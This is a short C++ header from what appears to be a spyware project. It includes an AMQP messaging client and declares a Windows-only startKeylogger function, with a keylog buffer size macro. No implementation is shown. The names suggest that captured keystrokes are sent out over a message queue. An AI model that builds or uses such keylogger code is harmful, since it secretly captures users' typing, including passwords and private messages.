#include "../amqp/AmqpClient.hpp"

#ifndef _SPYWARE_KEYLOGGER_HPP_
#define _SPYWARE_KEYLOGGER_HPP_ 1
#define _SPYWARE_KEYLOG_BUFFER_MAX_ 10

#if defined(_WIN64) || defined(_WIN32)
extern void startKeylogger(AmqpClient &amqpClient);
#endif

#endif